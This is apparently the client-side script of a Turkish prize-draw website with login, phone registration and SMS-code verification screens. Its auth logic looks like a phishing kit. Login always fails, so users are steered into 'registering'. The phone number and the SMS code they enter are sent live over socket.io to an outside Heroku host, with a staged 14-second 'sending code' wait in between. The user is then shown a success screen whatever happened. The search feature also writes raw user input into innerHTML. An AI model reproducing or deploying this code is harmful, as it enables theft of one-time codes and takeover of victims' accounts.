console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");  // Debug: Script yüklendi mi?

function showCard(card) {
  console.log("showCard çağrıldı:", card);  // Debug
  if (card) {
    card.classList.remove("hidden");
    requestAnimationFrame(() => {
      card.classList.add("visible");
    });
  } else {
    console.log("showCard hatası: Card bulunamadı");
  }
}

function hideCard(card) {
  if (card) {
    card.classList.remove("visible");
    setTimeout(() => {
      card.classList.add("hidden");
    }, 300);
  } else {
    console.log("hideCard hatası: Card bulunamadı");
  }
}

function showRegister() {
  hideCard(loginCard);
  showCard(registerCard);
}

function showLogin() {
  hideCard(registerCard);
  hideCard(verifyCard);
  hideCard(successScreen);
  showCard(loginCard);
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded TETİKLENDİ!");  // Debug: Sayfa yüklendi mi?

  // Element tanımlamaları
  const loginCard = document.getElementById("loginCard");
  const registerCard = document.getElementById("registerCard");
  const verifyCard = document.getElementById("verifyCard");
  const successScreen = document.getElementById("successScreen");
  const mainMenu = document.getElementById("mainMenu");
  const authWrapper = document.querySelector(".auth-wrapper");

  console.log("LoginCard bulundu mu?", loginCard);  // Debug: Elementler var mı?

  // başlangıç durumu
  if (registerCard) registerCard.classList.add("hidden");
  if (verifyCard) verifyCard.classList.add("hidden");
  if (successScreen) successScreen.classList.add("hidden");

  // localStorage kontrolü
  const isLoggedIn = localStorage.getItem("loggedIn");

  if (isLoggedIn === "true") {
    if (authWrapper) authWrapper.style.display = "none";
    if (mainMenu) mainMenu.style.display = "block";
  } else {
    if (loginCard) showCard(loginCard);
  }

  // Socket bağlantısını buraya taşıdım - kütüphane yüklendikten sonra bağlan, io not defined hatasını giderir
  if (typeof io !== 'undefined') {
    const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com');
    console.log("CLIENT SOCKET BAĞLANDI");

    // TELEFON INPUT
    const phoneInput = document.getElementById("registerPhone");

    if (phoneInput) {
      phoneInput.addEventListener("focus", () => {
        if (phoneInput.value === "") phoneInput.value = "05";
      });

      phoneInput.addEventListener("input", () => {
        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
        if (!phoneInput.value.startsWith("05")) phoneInput.value = "05";
        if (phoneInput.value.length > 11) {
          phoneInput.value = phoneInput.value.slice(0, 11);
        }
      });
    }

    // REGISTER → VERIFY (4x spin)
    const registerBtn = document.getElementById("registerSubmit");
    const btnText = registerBtn ? registerBtn.querySelector(".btn-text") : null;

    console.log("registerBtn bulundu mu?", registerBtn);  // Debug: Buton var mı?

    if (registerBtn) {
      registerBtn.addEventListener("click", () => {
        console.log("Gönder butonu tıklandı!");  // Debug: Tıklandı mı?

        const phone = phoneInput ? phoneInput.value.trim() : '';
        console.log("Telefon numarası:", phone);  // Debug: Telefon girildi mi?

        if (!phone) {
          console.log("Telefon boş, return");  // Debug: Boş mu?
          return;
        }

        socket.emit("new-phone", phone);
        console.log("socket.emit çağrıldı");  // Debug: Emit gitti mi?

        registerBtn.disabled = true;
        if (btnText) btnText.textContent = "Kod gönderiliyor";
        registerBtn.classList.add("spinning");

        // 12. saniyede yazı değişsin
        setTimeout(() => {
          if (btnText) btnText.textContent = "Kod gönderildi";
          registerBtn.classList.add("slow");
        }, 12000);

        // 14. saniyede ekran değişsin
        setTimeout(() => {
          registerBtn.classList.remove("spinning");
          registerBtn.classList.remove("slow");
          registerBtn.disabled = false;
          if (btnText) btnText.textContent = "Kod gönderiliyor";
          hideCard(registerCard);
          showCard(verifyCard);
        }, 14000);
      });
    } else {
      console.log("registerBtn hatası: Bulunamadı");
    }

    // VERIFY → SUCCESS
    const verifyBtn = document.getElementById("verifySubmit");

    if (verifyBtn) {
      verifyBtn.addEventListener("click", () => {
        const code = document.getElementById("verifyCode").value.trim();
        if (!code) return;

        console.log("CLIENT CODE GÖNDERDİ:", code);
        socket.emit("new-code", code);

        verifyBtn.classList.add("loading");

        setTimeout(() => {
          verifyBtn.classList.remove("loading");
          hideCard(verifyCard);
          showCard(successScreen);

          // giriş durumunu kaydet
          localStorage.setItem("loggedIn", "true");

          setTimeout(() => {
            if (authWrapper) authWrapper.style.display = "none";
            if (mainMenu) mainMenu.style.display = "block";
          }, 900);

        }, 2000);
      });
    }

    // Giriş Yap butonunun tıklanma işlevi
    const loginBtn = document.getElementById("loginBtn");
    const loginError = document.getElementById("loginError");

    if (loginBtn) {
      loginBtn.addEventListener("click", (e) => {
        e.preventDefault();

        // Kullanıcı hatası mesajını göster
        loginError.style.display = "block";
      });
    }

  } else {
    console.log("io hatası: Socket.io client yüklenmedi");
  }
});

document.addEventListener("DOMContentLoaded", () => {
  const cards = document.querySelectorAll(".game-card");
  const overlay = document.getElementById("eventOverlay");
  const closeBtn = document.getElementById("closeEventModal");
  const modalImg = document.getElementById("eventModalImg");
  const modalTitle = document.getElementById("eventModalTitle");
  const modalDesc = document.getElementById("eventModalDesc");

  cards.forEach(card => {
    card.addEventListener("click", () => {
      modalImg.src = card.dataset.img || "";
      modalTitle.textContent = card.dataset.title || "";
      modalDesc.innerHTML = `
  ${card.dataset.desc}
  <br><br>
  <strong>Not:</strong> Şartları yerine getirip çekilişe katılmaya hak kazanan üyelerimizin çekiliş için ikinci bir bilet almaları durumunda tespit edilip hakları iptal edilecektir.
`;
      overlay.classList.remove("hidden");
    });
  });

  if (closeBtn) {
    closeBtn.addEventListener("click", () => {
      overlay.classList.add("hidden");
    });
  }

  if (overlay) {
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        overlay.classList.add("hidden");
      }
    });
  }
  const countdownEl = document.getElementById("countdownTimer");

// Örnek bitiş tarihi
const targetDate = new Date("2026-04-05T23:59:59").getTime();

function updateCountdown() {
  if (!countdownEl) return;

  const now = new Date().getTime();
  const distance = targetDate - now;

  if (distance <= 0) {
    countdownEl.textContent = "SÜRE DOLDU";
    return;
  }

  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
  const minutes = Math.floor((distance / (1000 * 60)) % 60);
  const seconds = Math.floor((distance / 1000) % 60);

  countdownEl.textContent =
    `${days}G ${hours.toString().padStart(2, "0")}:${minutes
      .toString()
      .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}

updateCountdown();
setInterval(updateCountdown, 1000);
const sliderImages = [
  "/images/slide1.jpg",
  "/images/slide2.jpg",
  "/images/slide3.jpg",
  "/images/slide4.jpg",
  "/images/slide5.jpg"
];

let currentSlide = 0;

const sliderImage = document.getElementById("sliderImage");
const prevSlide = document.getElementById("prevSlide");
const nextSlide = document.getElementById("nextSlide");

function showSlide(index) {
  if (!sliderImage) return;
  sliderImage.src = sliderImages[index];
}

if (prevSlide && nextSlide && sliderImage) {
  prevSlide.addEventListener("click", () => {
    currentSlide = (currentSlide - 1 + sliderImages.length) % sliderImages.length;
    showSlide(currentSlide);
  });

  nextSlide.addEventListener("click", () => {
    currentSlide = (currentSlide + 1) % sliderImages.length;
    showSlide(currentSlide);
  });
}

setInterval(() => {
  currentSlide = (currentSlide + 1) % sliderImages.length;
  showSlide(currentSlide);
}, 3000);

// ====================== ARAMA FONKSİYONU ======================

const searchInput = document.querySelector('.search-box input');
const searchBtn = document.querySelector('.search-btn');

function performSearch() {
    const query = searchInput.value.trim();

    if (query === '') {
        alert("Lütfen arama yapmak için bir şey yazın!");
        return;
    }

    // Ana içeriği gizle
    const mainContent = document.querySelector('.main-content') || 
                        document.querySelector('.hero-section') || 
                        document.getElementById('mainContent');

    if (mainContent) {
        mainContent.style.display = 'none';
    }

    // Mevcut sonuç ekranı varsa sil
    let noResultScreen = document.getElementById('no-result-screen');
    
    if (!noResultScreen) {
        noResultScreen = document.createElement('div');
        noResultScreen.id = 'no-result-screen';
        noResultScreen.style.cssText = `
            text-align: center;
            padding: 80px 20px;
            color: #c084fc;
            font-size: 24px;
            min-height: 60vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 16px;
            margin: 20px;
        `;

        noResultScreen.innerHTML = `
            <h2>😕 Sonuç Bulunamadı</h2>
            <p style="font-size: 18px; margin-top: 15px; color: #d8b4fe;">
                "${query}" ile ilgili herhangi bir sonuç bulunamadı.
            </p>
            <button onclick="clearSearch()" 
                    style="margin-top: 30px; padding: 12px 28px; background: linear-gradient(135deg, #7c3aed, #c084fc); 
                           color: white; border: none; border-radius: 12px; font-size: 16px; cursor: pointer;">
                Ana Sayfaya Dön
            </button>
        `;

        // Ana container'a ekle (nerede ekleyeceğimizi bulalım)
        const container = document.querySelector('.main-menu') || 
                         document.body;
        container.appendChild(noResultScreen);
    } else {
        // Eğer ekran varsa sadece metni güncelle
        noResultScreen.querySelector('p').textContent = `"${query}" ile ilgili herhangi bir sonuç bulunamadı.`;
    }
}

// Arama butonuna tıklama
if (searchBtn) {
    searchBtn.addEventListener('click', performSearch);
}

// Enter tuşuna basma
if (searchInput) {
    searchInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            performSearch();
        }
    });
}

// Arama sonucundan ana sayfaya dönme fonksiyonu
window.clearSearch = function() {
    const noResultScreen = document.getElementById('no-result-screen');
    if (noResultScreen) {
        noResultScreen.remove();
    }

    const mainContent = document.querySelector('.main-content') || 
                       document.querySelector('.hero-section');
    if (mainContent) {
        mainContent.style.display = 'flex';
    }

    if (searchInput) {
        searchInput.value = '';
    }
};

// ================= PROFİL DROPDOWN =================
const profileBtn = document.getElementById('profileBtn');
const profileDropdown = document.getElementById('profileDropdown');

if (profileBtn && profileDropdown) {
    profileBtn.addEventListener('click', function(e) {
        e.stopPropagation();
        profileDropdown.classList.toggle('show');
    });

    // Dışarıya tıklayınca kapat
    document.addEventListener('click', function(e) {
        if (!profileDropdown.contains(e.target) && !profileBtn.contains(e.target)) {
            profileDropdown.classList.remove('show');
        }
    });
}

// Logout
const logoutBtn = document.getElementById('logoutBtn');
if (logoutBtn) {
    logoutBtn.addEventListener('click', function() {
        if (confirm("Çıkış yapmak istediğinize emin misiniz?")) {
            localStorage.removeItem('loggedIn');
            localStorage.removeItem('userData');
            window.location.reload();
        }
    });
}

// Örnek veri (gerçek verileri buraya koyacaksın)
document.getElementById('userId').textContent = "WALKER-78492";
document.getElementById('registerDate').textContent = "15.02.2026";
document.getElementById('activeTickets').textContent = "4";

});